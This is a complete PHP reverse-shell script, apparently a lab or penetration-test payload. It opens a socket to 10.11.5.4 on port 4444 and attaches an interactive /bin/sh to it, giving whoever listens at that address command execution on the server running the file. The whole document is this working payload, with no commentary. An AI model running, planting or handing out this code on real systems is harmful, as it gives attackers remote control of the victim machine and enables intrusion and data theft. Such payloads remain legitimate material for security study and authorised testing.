<?php
$sock = fsockopen("10.11.5.4", 4444);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
